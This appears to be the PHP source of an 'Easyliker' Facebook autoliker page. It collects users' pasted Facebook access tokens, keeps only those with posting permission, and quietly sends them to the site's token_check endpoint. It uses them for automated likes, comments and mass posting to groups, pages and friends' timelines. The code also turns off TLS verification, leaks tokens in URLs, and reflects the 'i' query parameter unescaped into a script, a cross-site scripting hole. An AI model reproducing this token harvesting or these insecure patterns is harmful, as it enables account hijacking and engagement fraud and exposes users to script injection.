<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Token Expired, Please Re-Generate new Token..! !');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('https://easyliker.com/token_check.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=Please Allow App to Access Your Profile! !, Try Again..');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=Logout Success..!!');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Easyliker Autolike | Best Facebook Autoliker, Commenter, Follower, Posters.</title>
    <link rel="shortcut icon" href="img/favicon.png" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Easyliker is the most trusted facebook autoliker in the world. It was realeased under Facebook Certifications! We are happy to announce Easyliker as the best facebook Autoliker.">
<meta name="keywords" content="Easyliker Facebook Autoliker, New Facebook Autolike, Facebook Autolike 2015, Mobile Autolike, Top 5 Facebook Autolikers">
<meta name="author" content="Sukh and Guri">
<meta property="og:image" content="https://www.easyliker.com/img/slider/robot3.png" />

<!-- Google Fonts -->
<link href='https://fonts.googleapis.com/css?family=Lato:400,700,300' rel='stylesheet' type='text/css'>
<!--[if IE]>
	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Lato:400" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Lato:700" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Lato:300" rel="stylesheet" type="text/css">
<![endif]-->

<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/font-awesome.css" rel="stylesheet">
<link href="css/theme.css" rel="stylesheet">
<link rel="stylesheet" href="styleswitcher/css/styleswitcher.css">
<link id="colours" rel="stylesheet" href="css/colour.css" />
<link href="css/prettyPhoto.css" rel="stylesheet" type="text/css"/>
<link href="css/zocial.css" rel="stylesheet" type="text/css"/>
<!-- SLIDER REVOLUTION 4.x CSS SETTINGS -->
<link rel="stylesheet" type="text/css" href="rs-plugin/css/settings.css" media="screen" />
<link rel="stylesheet" href="assets/stylesheets/arthreff.css">
<!--[if lt IE 9]>
<script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->
<div id="spot-im-root"></div><script>!function(t,e,o){function p(){var t=e.createElement("script");t.type="text/javascript",t.async=!0,t.src=("https:"==e.location.protocol?"https":"http")+":"+o,e.body.appendChild(t)}t.spotId="72687862eb086798aa20730251317aa2",t.spotName="",t.allowDesktop=!0,t.allowMobile=!1,t.containerId="spot-im-root",p()}(window.SPOTIM={},document,"//www.spot.im/embed/scripts/launcher.js");</script>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-M573FF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-M573FF');</script>
<!-- End Google Tag Manager -->

</head>
<body>
<script id="_wau8eq">var _wau = _wau || [];
_wau.push(["tab", "uiyi8yd3eoyg", "8eq", "right-upper"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#controller").hide();
$( "#finish" ).show();
});
});
</script>
<center>
<div id="finish"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="load.gif"></center>
Giving Likes To Your Post ID! <Br>Meanwhile Please <b style="color: red;">BE ONLINE ON EASYLIKER</b>
</div>
</div></center>
<!--header-->
	<div class="header">
<!--menu-->
    <nav id="main_menu" class="navbar" role="navigation">
      <div class="container">
            <div class="navbar-header">
        <!--toggle-->
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#menu">
				<i class="fa fa-bars"></i>
			</button>
		<!--logo-->
			<div class="logo">
				<a href="https://www.easyliker.com"><img src="img/logo.png" alt="" class="animated bounceInDown" /></a> 
			</div>
		</div>
           
            <div class="collapse navbar-collapse" id="menu">
                <ul class="nav navbar-nav pull-right">
                   			<li class="dropdown active"><a href="https://www.easyliker.com">Home</a></li>
							<li class="dropdown"><a href="javascript:{}">Our Sites</a>
						<ul class="dropdown-menu">
								<li><a href="http://www.hostidity.com" target="_blank">Hostidity</a></li>
								<li><a href="http://www.phpcoderx.com" target="_blank">PHPcoderX</a></li>
								<li><a href="http://www.beatspedia.com" target="_blank">Beatspedia</a></li>
								<li><a href="http://www.usaliker.com" target="_blank">USA Liker</a></li>
						</ul>
							</li>
							<li><a href="privacy.php" target="_blank">Privacy</a></li>
							<li><a href="about.php" target="_blank">About</a></li>
							<li><a href="contact.php" target="_blank">Contact</a></li>
							<li><a href="https://www.youtube.com/watch?v=qkCUK1H7TTg" target="_blank">How To Use?</a></li>
						</ul>
					</div>
				</div>
			</nav>
		</div>
	<!--//header-->
	
	<!--page-->
		<!-- REVOLUTION SLIDER -->
        <div class="tp-banner-container">
		<div class="tp-banner">
		<ul>
		<!-- Slide 1 -->
			<li data-transition="slideright">
				<img src="img/slider/slider1.jpg" alt="" />
				
				<!-- Caption -->
				<div class="tp-caption lfr" data-x="left" data-y="220" data-speed="2400" data-start="800" data-easing="easeOutExpo">
					<img src="img/slider/robot3.png" alt="" />
				</div>
					
				<!-- Caption -->
				<div class="tp-caption lfb" data-x="870" data-y="150" data-speed="1400" data-start="1800" data-easing="easeOutExpo">
					<img src="img/slider/rocket.png" alt="" />
				</div>
				
				<!-- Caption -->
				<div class="tp-caption lfb" data-x="825" data-y="340" data-speed="1500" data-start="1900" data-easing="easeOutExpo">
					<img src="img/slider/flames.png" alt="" />
				</div>
				
				<!-- Caption -->	
				<div class="caption sft stl" data-x="center" data-y="150" data-speed="1000" data-start="700" data-easing="easeOutExpo">
					<h3 class="rev-title bold">Easy Liker</h3>
				</div>
				
				<!-- Caption -->
				<div class="caption lfl stl rev-title-sub" data-x="center" data-y="260" data-speed="800" data-start="1100" data-easing="easeOutExpo">
					The Most Trusted Autoliker!
				</div>
				
				<!-- Caption -->
				<div class="caption sfb" data-x="center" data-y="350" data-speed="1100" data-start="1500" data-easing="easeOutExpo">               
				</div>
			</li>
			<!-- Slide 2 -->
				<li data-transition="slideleft">
				<img src="img/slider/slider2.jpg" alt="" />
				
				<!-- Caption -->
				<div class="tp-caption lfl" data-x="right" data-y="55" data-speed="1000" data-start="800" data-easing="easeOutExpo">
					<img src="img/slider/iMac2.png" alt="" />
				</div>
					
				<!-- Caption -->
				<div class="caption lfl stl bg" data-x="20" data-y="60" data-speed="800" data-start="700" data-easing="easeOutExpo">
					<h2 class="rev-title big white">Looking For More?<br>Go For USA-LIKER</h2>
				</div>
					
				<!-- Caption -->
				<div class="caption lfl stl rev-text rev-left" data-x="left" data-y="210" data-speed="800" data-start="1100" data-easing="easeOutExpo">
					<p class="hidden-xs">Need Instant more likes? Dont want to wait 15 minutes,<br />
					it's Autolike Revolution! Get more likes with our new liker,<br/>
					Developed by same developers and secured with SSL.
					<br/>Go Now!</p>
				</div>
					
				<!-- Caption -->
				<div class="caption sfb stb rev-left" data-x="left" data-y="430" data-speed="1100" data-start="1500" data-easing="easeOutExpo">
					<a href="https://www.usaliker.com" class="btn btn-outline btn-mobile2 marg-right5">USA-LIKER</a>
					<a href="contact.php" class="btn btn-outline btn-mobile2">CONTACT</a>                     
				</div>
			</li>
			</ul>
			<div class="tp-bannertimer tp-bottom"></div>
            </div>
        </div>
        <!-- // END REVOLUTION SLIDER -->

	<div id="banner">
	<div class="container intro_wrapper">
	<div class="inner_content">
	
	<!--welcome-->
		<div class="welcome_index">
			Hello, Welcome to <a><span class="hue_block white normal">EASYLIKER</span></a> Follow The Login Method Below. 
			<span class="hue">Powerful</span>	and Best Facebook <span> Autoliker</span>
			- Easyliker Team
		</div>
		
	<!--//welcome-->
		</div>
			</div>
				</div>
				<!--//banner--><br><br>
				<center>
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Hostidity Recommended -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2705417471104722"
     data-ad-slot="1148800898"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
	<div class="container wrapper">
	<div class="inner_content">
	<div class="tile">
	<h1><strong><center>
		<?php if ($token){echo " ".$user->firt_name;}else{
		?>
		</center></strong></h1>		
<center>
<div class="alert alert-info">
      <h3><strong>Welcome <font color="red">Anonymous</font>! Just follow steps below to Login to EasyLiker.</strong></h3>
    </div>
	<h2>
<b><a class="btn btn-medium btn-danger" href="token.php" target="_blank"> <i class="fa fa-refresh fa-lg fa-spin"></i> Click Here</a> And Allow Permission To The APP, And Copy Paste The Url Below</br></b>
</h2><h3>
DON'T FORGET TO ALLOW
					<a rel="nofollow" href="https://www.facebook.com/settings?tab=subscribers" target="_blank"><b>Facebook Followers [Settings]</b></a> As Well<br/></h3><h2>
<br>
</center>		
		<?php
		}
		?><?php if ($token): ?>
	

<center>
<div class="alert alert-success">
      <h3><strong><font color="red"><?php echo "Well done! ".$user->first_name; ?></font>  You successfully logged in to Easy Liker.</strong></h3>
    </div>
<img src="https://graph.facebook.com/me/picture?width=200&height=200&access_token=<?php echo $token;?>" alt="Easyliker Heartly Welcomes You!" style="height:100px;width:100px;border: 1px solid black;" class="trans" />
<br>
<b>Please select one service<b> <span class="color">below!</span></b><br>
<a href="liker.php" class="btn btn-info">Use Auto Likes</a>
<a href="comment.php" class="btn btn-warning">Use Multi Comment</a>
<a href="/autopost/multy_groups.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Groups</a>
<a href="/autopost/multy_pages.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Pages</a>
<a href="/autopost/multy_friends.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Friends Timeline</a>
<form method="post" action="">
<input type="submit" class="btn btn-danger" name="logout" style="margin-top: 3px; margin-left: 1%;" value="Logout"></form></center>
<br><br>
				<center>
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Hostidity Recommended -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2705417471104722"
     data-ad-slot="1148800898"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
				
<?php else: ?>
<center>  <form action="verify.php" method="GET" onsubmit="CheckToken()">
					
					<input type="text" name="user"" value=""  style="width: 70%;" class="form-control" placeholder="https://www.skype.com/token/#access_token=CAAAAPJmB8ZBwBAOvUYsAMT9ZAmj223CjirdRDqZAUVR0uvGV0PeYj4sUiCWL8lzq43AfS3CctwaJjw5x7ZAVq8NB22p&expires_in=0"
		 id="accesstoken"			autocomplete="off">
					 
					<button type="submit" style="width: 100px;" class="btn btn-success">
                <i class="fa fa-sign-in  fa-lg"></i> Login
            </button>
				</form>	</h2><br><br>	<center>
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Hostidity Recommended -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2705417471104722"
     data-ad-slot="1148800898"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>	<?php endif ?>	</center>	<center>
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="loading.gif"></center>
EasyLiker Is Verifying Your Token! <Br>Mean while <b style="color: red;">Please Wait...</b>
</div>
</div></div></center>
		<hr>
<center>
<h1><i class="fa fa-smile-o"></i> Our Happy Users</h1>
</center>
<center>
<iframe src="recentusers.php" width="500" height="80" frameBorder="0" scrolling="no">
</iframe></center>		
		</div>
		<!--//page-->
	</div>
	<center>
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Hostidity Recommended -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2705417471104722"
     data-ad-slot="1148800898"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
	<!-- footer -->
	<div id="footer">
		<h1>Sharing is Sexy</h1>
	<div class="follow_us">
<a href="#" class="btn followSelector">Share!</a>
		</div>
	</div>
	
	<!-- footer 2 -->
	<div id="footer2">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
				<div class="copyright">
							EASYLIKER
							&copy;
							<script type="text/javascript">
							//<![CDATA[
								var d = new Date()
								document.write(d.getFullYear())
								//]]>
								</script>
							 - All Rights Reserved :
							Designed by <a href="http://www.phpcoderx.com">PHPcoderX</a>
						</div>
						</div>
					</div>
				</div>
					</div>
				
<!-- SCRIPTS -->
<script src="js/jquery.js"></script>			
<script src="js/bootstrap.min.js"></script>	
<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.tools.min.js"></script>   
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
<!-- slider settings -->
<script type="text/javascript">
	//<![CDATA[
			jQuery(document).ready(function() {
					jQuery('.tp-banner').show().revolution(
				{
					delay:9000,
					startwidth:1170,
					startheight:600,
					navigationType:"bullet",
					navigationStyle:"square",
					hideBulletsOnMobile:"on",
					hideArrowsOnMobile: "on",
					shadow:0,
					fullWidth:"on",
				});
			});	
		//]]>
	</script>
<script type="text/javascript">

//<![CDATA[
   	window.fbAsyncInit = function() {
		FB.init({ appId: '171342606239806', 
			status: true, 
			cookie: true,
			xfbml: true,
			oauth: true
		});
   		    
	  		  	function updateButton(response) {
	    	var button = document.getElementById('fb-auth');
		
			if(button) {	
	    		if (response.authResponse) {
	      		// user is already logged in and connected
				button.onclick = function() {
					if($('login-form')){
						$('modlgn-username').set('value','Facebook');
						$('modlgn-passwd').set('value','Facebook');
						$('login-form').submit();
					} else if($('com-login-form')) {
					   $('username').set('value','Facebook');
					   $('password').set('value','Facebook');
					   $('com-login-form').submit();
					}
				}
			} else {
	      		//user is not connected to your app or logged out
	      		button.onclick = function() {
					FB.login(function(response) {
					   if (response.authResponse) {
					      if($('login-form')){
					      	$('modlgn-username').set('value','Facebook');
					      	$('modlgn-passwd').set('value','Facebook');
					      	$('login-form').submit();
					      } else if($('com-login-form')) {
					         $('username').set('value','Facebook');
					         $('password').set('value','Facebook');
					         $('com-login-form').submit();
					      }
					  } else {
					    //user cancelled login or did not grant authorization
					  }
					}, {scope:'email'});  	
	      		}
	    	}
	    }
	  }
	  // run once with current status and whenever the status changes
	  FB.getLoginStatus(updateButton);
	  FB.Event.subscribe('auth.statusChange', updateButton);	
	  	};
    //      
   window.addEvent('load', function(){
        (function(){
                if(!document.getElementById('fb-root')) {
                     var root = document.createElement('div');
                     root.id = 'fb-root';
                     document.getElementById('gkfb-root').appendChild(root);
                     var e = document.createElement('script');
                 e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
                     e.async = true;
                 document.getElementById('fb-root').appendChild(e);   
                }
        }());
    }); 
    //]]>
</script>
<script src="js/jquery.touchSwipe.min.js"></script>
<script src="js/jquery.mousewheel.min.js"></script>				
<script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
<script type="text/javascript" src="js/scripts.js"></script>
<script src="js/retina.js"></script>
<!-- carousel -->
<script type="text/javascript" src="js/jquery.carouFredSel-6.2.1-packed.js"></script>
<script type="text/javascript">
//<![CDATA[
jQuery(document).ready(function($) {
	$("#slider_home").carouFredSel({ 
		width : "100%", 
		height : "auto",
		responsive : true,
		auto : false,
		items : { width : 280, visible: { min: 1, max: 3 }
		},
		swipe : { onTouch : true, onMouse : true },
		scroll: { items: 1, },
		prev : { button : "#sl-prev", key : "left"},
		next : { button : "#sl-next", key : "right" }
		});
	});
//]]>
</script>
<script src="styleswitcher/js/styleswitcher.js"></script>
<script src="assets/javascripts/socialShare.min.js"></script>
<script src="assets/javascripts/socialProfiles.js"></script>
<script>
	$(document).ready(function () {

		$('.shareSelector').socialShare({
			social: 'facebook,twitter,google',
			whenSelect: true,
			selectContainer: '.shareSelector',
			blur: true
		});

		$('.followSelector').socialProfiles({
			animation: 'chain',
			blur: true,
			facebook: 'sharer/sharer.php?u=https://www.easyliker.com/',
			google: 'share?url=https://www.easyliker.com/',
			twitter: 'share?url=https://www.easyliker.com/',
		});
	});
</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-50001635-15', 'auto');
  ga('send', 'pageview');

</script>


</body>
</html>
